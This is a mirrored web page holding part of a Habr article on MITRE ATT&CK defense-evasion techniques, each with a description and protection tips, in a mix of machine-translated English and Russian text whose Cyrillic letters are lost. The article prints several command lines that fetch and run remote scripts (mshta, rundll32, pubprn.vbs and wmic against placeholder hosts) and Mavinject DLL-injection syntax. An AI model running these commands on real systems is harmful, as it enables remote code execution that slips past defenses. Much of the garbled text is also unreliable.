    ,   .NET Framework. Installutil     VisualStudio.  InstallUtil.exe   Microsoft   : <br><br> <i>C:\Windows\Microsoft.NET\Framework\v[version]\InstallUtil.exe</i> <br><br>     InstallUtil  -      . <br><br> <i>  :</i>       InstallUtil,      InstallUtil.exe. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1149">LC_MAIN Hijacking</a> </h3><br> <i>:</i> macOS <br> <i>:</i> ,  <br> <i>:</i>   OS X 10.8    mach-O   LC_MAIN,          .        LC_THREAD  LC_UNIXTHREAD.             ,       ,     .          ,           . <br><br> <i>  :</i>  ,       .   LC_MAIN         . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1152">Launchctl</a> </h3><br> <i>:</i> macOS <br> <i>:</i> ,  <br> <i>:</i> Launchctl ‚Äî     Launchd. C  Launchctl       (LaunchDeamons  LaunchAgents),      . Launchctl     ,      : <br><br> <i>launchctl submit -l [labelname] ‚Äî /Path/to/thing/to/execute ''arg" ''arg" ''arg"</i> . <br><br>               ,  launchctl   ,  ,          . <br><br> <i>  :</i>      Launch Agents   Launch Deamons    .    <i>KnockKnock</i>   ,   launchctl   Launch Agents  Launch Deamons. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1036"> (Masquerading)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br> <i>:</i>        ,   ,         .    . <br>     ,            ,  .         .       ,          ,       . <br><br>  <b>Windows</b> <br>    ‚Äî        ,   rundll32.exe.            ,   ,         . <br>      Windows   C:\Windows\System32.    ,   explorer.exe  svchost.exe     . <br><br>  <b>Linux</b> <br>         ,          ,  .     Linux   /bin,         rsyncd  dbus-inotifier. <br><br> <i>  :</i>             .    .           ,   C:\Windows\System32.             . <br><br>    -   ,      . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1112">  (Modify Registry)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i> , , system <br> <i>:</i>                       . <br><br>          .   Reg           .        ,      Windows API. <br><br>          , ,         .     Reg  API     .      ,      ,      . <br><br>       ,       Remote Regisry service.  ,      ,     Windows Admin Shares   RPC. <br><br> <i>  :</i>         ,       ( <a href="https://attack.mitre.org/wiki/Technique/T1058">Service Registry Permissions Weakness</a> ). ,        .       ,       .      (Event ID4657),   ,   ,       RegHide,       . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1170">Mshta</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i> Mshta.exe (  <i>C:\Windows\System32\</i> ) ‚Äî  ,    Microsoft HTML (*.HTA). HTA-      ,   InternetExplorer,   .    ,  Mshta           mshta.exe  -  HTA-, Javascript  VBScript.       : <br><br> <i>mshta vbscript:Close(Execute(¬´GetObject(¬ª¬´script:https[:]//webserver/payload[.]sct¬ª")"))</i> <br><br>  ,  URL-: <br><br> <i>mshta http[:]//webserver/payload[.]hta</i> <br><br> <i>  :</i>  mshta.exe     IE,    .  Mshta.exe,     . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1096">NTFS-  (NTFS File Attributes)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Description: The</i> NTFS partition contains the Master File Table (MFT) in which data about the contents of the volume are stored, the rows correspond to the files, and the columns of their attributes, including attributes such as Extended attributes (EA), are 64kb in row and Alternate Data Streams (ADS) - arbitrary-sized metadata that can be used to store any data.  Attackers can store malicious data and binary files in extended attributes and file metadata.  This technique allows you to bypass some protection tools, such as scanning tools based on static indicators and some anti-virus tools. <br><br>  <i>Security Tips:</i> Blocking access to EA and ADS can be quite complex and impractical and, in addition, lead to unstable operation of the standard OS functionality.  Direct protection vector to prevent software from starting, which can be used to hide information in EA and ADS. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1126">Removing connections to network resources (Network Share Connection Removal)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Administrator, user <br>  <i>Description:</i> Network folder and Windows Admin Share connections can be deleted if they are no longer required.  Net is an example utility that can be used to delete network connections: <i>net use \ system \ share / delete</i> .  Opponents can remove network connections that they do not need to clear traces of intrusion. <br><br>  <i>Security Tips:</i> Follow best practices for organizing Windows Admin Shares.  Identify unnecessary system utilities and software that can be used to connect to network shares and consider auditing its use or blocking. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1027">Obfuscated Files or Information</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Description:</i> Attackers can use encryption, encryption, and various methods of obfuscating files and their contents in the system or during their transfer. <br>  Payloads can be archived or encrypted, sometimes for their deobfuscation and subsequent launch some user action is required, for example, to enter a password to open an archive prepared by an attacker. <br><br>  To hide plain text lines, parts of files can also be encoded.  Payloads can be divided into separate "benign" files that, when assembled into a single unit, perform malicious functionality. <br><br>  Opponents can also confuse commands called from payloads directly or via the command line interface.  Environment variables, aliases, and symbols specific to the semantics of the platform or language can be used to bypass signature-based and whitelisted malware detection. <br><br>  Another example of obfuscation is the use of steganography - the technique of hiding data or code in images, sound tracks, video and text files. <br><br>  <i>Recommendations for protection:</i> Use the tools for analyzing and detecting malicious code that do not only check the source code itself, but also analyze the process of executing commands.  In Windows 10, this functionality is presented in the form of the Antimalware Scan Interface (AMSI). <br><br>  The presence of escape characters in commands, such as ^ or ", can serve as an indicator of obfuscation. With the help of Windows Sysmon and Event ID 4688 events, you can view the arguments of commands executed in various processes. <br><br>  The obfuscation used in the payloads during the initial access stage can be detected on the network using an IDS system and email security gateways that identify compressed, encrypted data and scripts in the attached files.  Detection of payloads transmitted over an encrypted connection from a website can be performed by inspecting encrypted traffic. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1150">Plist Modification</a> </h3><br>  <i>System:</i> macOS <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> Criminals can modify plist files by specifying their own code in them to execute it in the context of another user.  The plist properties files located in / Library / Preferences run with elevated privileges, and plist from ~ / Library / Preferences run with user privileges. <br><br>  Security Tips <i>:</i> Prevent plist files from being modified by making them read-only. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1205">Port knocking</a> </h3><br>  <i>System:</i> Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> Attackers can use the Port Knocking methods to hide the open ports that they use to connect to the system. <br><br>  <i>Security</i> Tips <i>:</i> Using stateful firewalls can prevent some Port Knocking options from being implemented. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1186">Process doppelganging</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> Transactional NTFS (TxF) is a technology introduced for the first time in Vista that allows file operations using transactions.  In TxF, only one transaction descriptor can write a file at the moment, all other descriptors will be isolated and can only read the file version recorded at the moment of opening.  If the system or application crashes, TxF will automatically roll back changes to the file.  TxF is still enabled in Windows 10. <br><br>  Technique Process Doppelganging (with German. "Two-stage transmission", "double move") involves the use of undocumented features WinAPI and is implemented in 4 steps: <br><br><ol><li>  Transaction  An NTFS transaction is created using the attacked executable file, a temporary modified version of the executable file is created as part of the transaction. </li><li>  Loading.  A shared section is created in memory, into which a modified version of the executable file is loaded. </li><li>  Rollback  An NTFS transaction is rolled back, with the result that the original file being attacked is saved on the disk in its original form. </li><li>  Animation.  Using a modified version of the executable file that remains in RAM, a process is created and its execution is launched. </li></ol><br>  Thus, the malicious code will work in the context of a legitimate trusted process.  Given that the attack occurs only in memory, because  The NTFS transaction does not end, but ‚Äúrolls back‚Äù, no traces of malicious activity will remain on the disk. <br><br>  <i>Security Tips:</i> Preventive security measures in the form of blocking some API calls are likely to have negative side effects.  The protection vector should be aimed at preventing the launch of the attacker's tools at an earlier stage in the attack chain.  Doppelganging can be used to circumvent protection, but it is still good practice to block potentially dangerous applications and restrict software being used with whitelists.  Attack detection is performed by analyzing calls to the CreateTransaction API functions, CreateFileTransacted, RollbackTransaction, undocumented functions like NTCreateProcessEX, NtCreateThreadEX, as well as API calls used to change memory in another process, such as WriteProcessMemory. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1093">Process Hollowing</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description: The</i> attack is carried out by replacing the image of the executable file of the process during the suspension of the process.  Included in the <a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">top ten techniques of injection processes</a> . <br><br>  <i>Security Tips:</i> Preventive security measures in the form of blocking some API calls are likely to have negative side effects.  The protection vector should be aimed at preventing the launch of the attacker's tools at an earlier stage in the attack chain.  Process Hollowing can be used to bypass security tools, but it is still good practice to block potentially dangerous applications and restrict software being used with whitelists. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1055">Code Injection into Process (Process Injection),</a> <a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">Ten Process Injection Techniques</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User, administrator, system, root <br>  <i>Description:</i> Process injection is a method for executing an arbitrary code in the address space of a separate living process.  Running code in the context of another process allows access to the memory of the process being injected, system / network resources, and possibly elevated privileges.  Process injections can also be used to avoid possible detection of malicious activity by security tools.  Techniques for implementing injections into processes are based on the abuse of various mechanisms that ensure the multithreading of program execution in the OS.  The following are some approaches to performing code injection into the process. <br><br>  <b>Windows</b> <br>  ‚Ä¢ DLL injection.  They are performed by recording the path to the malicious DLL inside the process with its subsequent execution by creating a remote thread (Remote thread is a thread that operates in the virtual address space of another process).  In other words, malware writes a DLL to the disk, and then uses a function like CreateRemoteTread, which will call the LoadLibrary function in the injected process. <br>  ‚Ä¢ PE injections (Portable executable injection) are based on the abuse of the execution features in memory of PE files, such as DLL or EXE.  Malicious code is written to the process without writing any files to disk, and then using its additional code or by creating a remote stream, its execution is called. <br>  ‚Ä¢ Thread execution hijacking includes injection of malicious code or a path to a DLL directly into the process stream.  Like the Process Hollowing technique, the flow must first be suspended. <br>  ‚Ä¢ Injections into asynchronous call procedures (Asynchronous Procedure Call (APC) injection) involve the attachment of malicious code to an APC Queue (APC Queue) process flow.  One of the APC injection methods, called ‚ÄúEarle Bird injection‚Äù, involves creating a suspended process in which malicious code can be recorded and launched to the process entry point via APC.  AtomBombing is another injection option that uses APC to invoke malicious code previously recorded in the Global atom table. <br>  ‚Ä¢ Injections into the local storage of the stream (Thread Local Storage (TLS) injection) involve manipulating the memory pointers inside the executable PE file to redirect the process to the malicious code. <br><br>  <b>Mac and Linux</b> <br>  ‚Ä¢ The system variables LD_RPELOAD, LD_LIBRARY_PATH (Linux), DYLIB_INSERT_LIBRARIES (macOS X) or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) into a process, which in turn can be used to intercept API calls from running processes. <br>  ‚Ä¢ The Ptrace system call can be used to connect to a running process and change while it is running. <br>  ‚Ä¢ / proc / [pid] / mem provides access to the process memory and can be used to read / write arbitrary data, but this method is rarely used due to the complexity of its implementation. <br>  ‚Ä¢ Capturing a VDSO (Virtual dynamic shared object) allows you to inject code during the execution of ELF binaries by manipulating code plugs from linux-vdso.so. <br>  Malicious programs typically use code injection into the process to access system resources, due to which an attacker can gain a foothold in the system and perform other changes in the attacked environment.  More complex samples can perform multiple injections of processes to make their detection more difficult. <br><br>  <i>Protection recommendations:</i> Methods of code injection into processes are based on the abuse of regular OS functions, direct effects on which can lead to unstable operation of legitimate software and security products.  Efforts to prevent interception techniques need to be focused on the earlier stages of the attack chain.  Use tools to block potentially dangerous software, such as AppLocker.  Use Yama as a preventive measure against code injection in ptrace, limiting the use of ptrace to privileged users only.  Additional security measures may include the deployment of kernel security modules that provide advanced access control and process restriction.  These tools include SELinux, grsecurity, AppArmor. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1108">Redundant Access</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> Attackers can simultaneously use several remote access tools with different control protocols to diversify detection risks.  So, if one of the remote access tools is detected and blocked, but the protecting party has not identified all the attacker's tools, then the remote access to the attacked network will still be preserved.  Attackers can also attempt to gain access to valid accounts of remote corporate services, such as VPN, to gain alternative access to the system in the event of blocking the main tools of remote access.  Using a web shell is also one of the methods of remote access to the network through a web server. <br><br>  <i>Protection recommendations:</i> Monitor the presence and blocking of launching on your network of known remote access tools (AmmyAdmin, Radmin, RemotePC, VNC, etc.), use the application launch control tools and blocking potentially dangerous software.  Implementing IDS and IPS systems that identify specific malware using signatures will reduce the likelihood of a successful attack, but over time, attackers will modify their tools to change the signature and, as a result, bypass IDS and IPS systems. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1121">Regsvcs / Regasm</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> Regsvcs and Regasm are Windows utility utilities used to register in the .NET Component Object Model (COM) assembly system.  Both files are digitally signed by Microsoft.  Criminals can use Regsvcs and Regasm to proxy code when the code that must be run before registering or unregistering is specified as an attribute: [ComRegisterFunction] or [ComUnregisterFunction].  The code with such attributes can be run even if the process is executed with insufficient privileges or even ‚Äúcrashes‚Äù at startup. <br><br>  <i>Security</i> Tips <i>:</i> Block Regsvcs.exe and Regasm.exe if they are not used on your system or network. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1014">Rootkit</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> Administrator, System, root <br>  <i>Description:</i> Rootkits are programs that hide the presence of malware by intercepting and modifying API calls.  Rootkits can work at the user level, the OS kernel or even lower, at the hypervisor, MBR or system firmware level.  Opponents use rootkits to hide the presence of programs, files, network connections, drivers, and other OS components. <br><br>  <i>Protection recommendations:</i> Identify and block potentially dangerous software that may contain rootkits using software whitelisting tools, anti-virus tools, or built-in OS protection. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1085">Rundll32</a> <a href="https://www.symantec.com/security-center/writeup/2014-080408-5614-99%25E2%2580%258B">(Poweliks)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> Rundll32.exe is a system utility for running programs in dynamic link libraries that can be invoked to proxy a binary file, execute Windows control files (.cpl) through the undocumented functions of shel32.dll - <i>Control_RunDLL</i> and <i>Control_RunDLLAsUser</i> .  Double-clicking on the .cpl file also causes Rundll32.exe to execute.  Rundll32 can also be used to execute scripts such as javascript: <br><br>  <i>rundll32.exe javascript: "\ .. \ mshtml, RunHTMLApplication"; document.write (); GetObject ("scrirpt: https [:] // www [.] example [.] com / malicious.sct") "</i> <br><br>  The above described method of using rundll32.exe is detected by antivirus software like a virus like Poweliks. <br><br>  <i>Protection Tips:</i> Attack Surface Reduction (ASR) in EMET and Advanced Theart Protection in Windows Defender can block the use of Rundll32.exe to bypass white lists. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1198">SIP and Trust Provider Capture (SIP and Trust Provider Hijacking)</a> or <a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf">Subverting Trust in Windows</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Administrator, System <br>  <i>Description:</i> Attackers can modify the components of the signing architecture and verification of the digital signature of a Windows code in order to bypass the launch control tools that allow only signed code to be run.  To create, sign, and verify the signature of files of various formats, Windows uses the so-called <i>Subject Interface Package (SIP)</i> ‚Äîthe software specifications that are unique for each file type, which ensure interaction between the API functions that initiate the creation, calculation and verification of signatures and directly files.  The validity of the signature is confirmed by the so-called <i>Trust Provider</i> - these are the software components of the operating system that carry out various procedures related to the calculation and verification of digital signatures. <br><br>  Popular attack methods: <br><ul><li>  Modifying the <i>DLL</i> and <i>FuncName keys</i> in the <i>CryptSIPDllGetSignedDataMsg</i> section: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Cryptography \ OID \ EncodingType 0 \ CryptSIPDllGetSignedDataMsg \ [SIP_GUID]</i> . <br>  It is executed with the purpose of replacing a DLL library that provides the <i>CryptSIPDllGetSignedDataMSG</i> function, which returns a coded digital certificate from a signed file.  A dummy function can always return a previously known valid signature value (for example, a Microsoft signature for executable system files) when using a modified SIP.  The attacker may attempt to apply one valid signature to all files, however, this will most likely lead to the signature being invalid, since the hash returned by the function will not match the hash calculated from the file. </li><li>  Modification of <i>DLL</i> and <i>FuncName keys</i> in the section: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Cryptography \ OID \ EncodingType 0 \ CryptSIPDllVerifyIndirectData / [SIP_GUID]</i> . <br>  It is executed with the purpose of replacing the DLL library that provides the <i>CryptSIPDllVerifyIndirectData</i> function, which <i>checks the</i> hash calculated from the file with the hash specified in the digital signature and returns the result of the verification (True / False).  ,        c   SIP.            ,         DLL-. </li><li>   <i>DLL</i>  <i>FuncName</i>  : <br> <i>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\Providers\Trust\FinalPolicy/[Trust Provider GUID]</i> . <br>     DLL-,   FinalPolicy   Trust Provider,  ,       .    CryptSIPDllVerifyIndirectData,         DLL-. </li></ul><br> <i> ,       Windows        DLL (DLL Search Order Hijacking).</i> <br><br> <i>  :</i> ,         ,    SIP  Trust Provider.       SIP.       DLL, ,   Windows AppLocker  DeviceGuard. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1064"> (Scripting)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br> <i>:</i>  <br> <i>:</i>        ,    ,  ,  ,    .                  API    .       Office         .              ,     .        ‚Äî Metasploit, Veil, PowerSploit. <br><br> <i>  :</i>    ,   VBScript  PowerShell.  Windows    MS Office        GPO.   ,         .     , , Sandboxie  Windows  Apparmor, Docker  Linux. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1218">-     (Signed Binary Proxy Execution)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i>  ,    ,     Windows,    .   Microsoft,      Windows,        : <br><br> ‚Ä¢ Mavinject.exe ‚Äî   Windows,    . Mavinject     DLL   : <br> <i>¬´C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe¬ª [PID] /INJECTRUNNING [PATH DLL];</i> <br> <i>C:\Windows\system32\mavinject.exe [PID] /INJECTRUNNING [PATH DLL];</i> <br> ‚Ä¢ SyncAppvPublishingServer.exe ‚Äî     powershell-   powershell.exe. <br>   <i><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">  </a></i> . <br><br> <i>  :</i>         ,      . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1216">-     (Signed Script Proxy Execution)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i> ,   ,      , ,  <i>PubPrn.vbs</i>   Microsoft         : <br> <i>cscript C:\Windows\System32\Printing_Admin_Scripts\ru-RU\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</i> <br><br> <i>  :</i>         ,      . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1045">  (Software Packing)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>           ,       ,         .        .    ‚Äî     MPRESS  UPS,      ,  ,       ,      ,    .         ,                . <br><br> <i>  :</i>    ,       ,    .    - . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1151">    (Space after Filename)</a> </h3><br>  <i>System:</i> Linux, macOS <br> <i>:</i>  <br> <i>:</i>      ,   .     (    .app)             . ,     Mach-O   evil.bin,        Terminal.app   .       evil.txt,         . ,     ¬´evil.txt ¬ª (  ),             .              . <br><br> <i>  :</i>     , ..      ,              , ,         . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1099">Timestomp</a> </h3><br> <i>:</i> Windows, Linux <br> <i>:</i> , , System <br> <i>:</i> Timestomp ‚Äî      (, , ).       ,      ,           .        ,       . <br><br> <i>  :</i>       -   .                           . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1127">    (Trusted Developer Utilities)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i>   ,                 ,   - .      ,                 . <br> ‚Ä¢ MSBulid ‚Äî     ,   Visual Studio.      XML-,         . MSBuild  .NET  4    C#  XML-,     . MSBulid.exe    Microsoft. <br> ‚Ä¢ DNX ‚Äî .Net Execution Environmant (dnx.exe)       (development kit)   Visual Studio Enterprise.    .NET Core CLI  2016 . DNX     Windows          .Net Core  ASP.NET Core 1.0. Dnx.exe        - . <br> ‚Ä¢ RCSI ‚Äî      C#,   csi.exe.        Roslyn .Net. Rcsi.exe    Microsoft.   C# .csx        Rcsi.exe    Windows. <br> ‚Ä¢ WinDbg/CDB ‚Äî   MS Windows       user-mode.   Microsoft cdb.exe      user-mode.       .     , -         Windows.   WinDbg.exe  CDB.exe    Microsoft      . <br> ‚Ä¢ Tracker ‚Äî    tracker.exe.   .NET   MSBuild.        Windows 10.    tracker.exe   DLL   . Tracker.exe    Microsoft. <br><br> <i>  :</i>       ,        . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1078">Valid Accounts</a> </h3><br> <i>:</i>                  ,          .                   ,   VPN, OWA,             .           ,    .                        . <br><br> <i>  :</i>   ,                  .   ,          ,       .       SIEM-. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1102">Web- (Web Service)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i>    ,   Web-         .    Command and control (&amp;C  2).  -          C2,        Google  Twitter.          . -   SSL/TLS,       . <br><br> <i>  :</i>   -        . IDS/IPS-,   ,        .   ,        C2    ,        .            . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1220"> XSL- (XSL Script Processing)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i> Extensible Stylesheet Language (*.xsl),  ,         XML-.      XSL         .     ,    .       (Trusted Developer Utilities),   msxsl.exe,   XML-    (html, wml, rtf, pdf  ..)      JavaScript,      (   URL-) XSL-.    msxsl.exe  ,           .   msxsl.exe: <br> <i>msxsl.exe customers[.]xml script[.]xsl</i> . <br>    ,  Squiblytwo,    WMI   JScript  VBScript  xsl-.   ,  Squiblydoo,   regsrv32.exe,      Windows: <br> ‚Ä¢  : <i>wmic process list /FORMAT:evil[.]xsl;</i> <br> ‚Ä¢  : <i>wmic os get /FORMAT:¬´https[:]//example[.]com/evil[.]xsl¬ª.</i> <br><br> <i>  :</i>       msxsl.exe,    .  WMI      ,     . </div><p>Source: <a href="https://habr.com/ru/post/432624/">https://habr.com/ru/post/432624/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../432612/index.html">In schools of the Kirov region earned Factory programmers</a></li>
<li><a href="../432616/index.html">MIT course "Computer Systems Security". Lecture 20: "Security of mobile phones", part 1</a></li>
<li><a href="../432618/index.html">MIT course "Computer Systems Security". Lecture 20: "Mobile Phone Security", part 2</a></li>
<li><a href="../432620/index.html">MIT course "Computer Systems Security". Lecture 20: "Mobile Phone Security", part 3</a></li>
<li><a href="../432622/index.html">Need more different Blur's</a></li>
<li><a href="../432626/index.html">Methods of interaction with the system: from punched tapes to neural interfaces</a></li>
<li><a href="../432628/index.html">@Pythonetc November 2018 Compilation</a></li>
<li><a href="../432630/index.html">Everything you wanted to know about processing requests, but were shy to ask</a></li>
<li><a href="../432632/index.html">The story of Lenny, the beloved Internet troll phone spammers</a></li>
<li><a href="../432634/index.html">An overview of five HTTP libraries for web development</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>